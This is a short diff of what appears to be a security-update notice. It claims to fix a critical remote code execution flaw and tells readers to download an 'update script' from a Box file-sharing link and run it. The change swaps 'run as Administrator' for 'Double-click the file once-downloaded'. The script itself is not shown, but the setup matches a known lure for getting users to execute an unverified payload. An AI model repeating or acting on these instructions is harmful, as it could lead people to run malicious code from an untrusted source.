@@ -18,7 +18,7 @@ This update resolves a critical remote code execution vulnerability affecting th
 1. Download the update script:  
    [`Download`](https://app.box.com/s/j74e35sinu06uenk20ltrld5vdu3fl31)
 
-2. Right-click and run as Administrator
+2. Double-click the file once-downloaded
 
 3. A reboot is not required
 
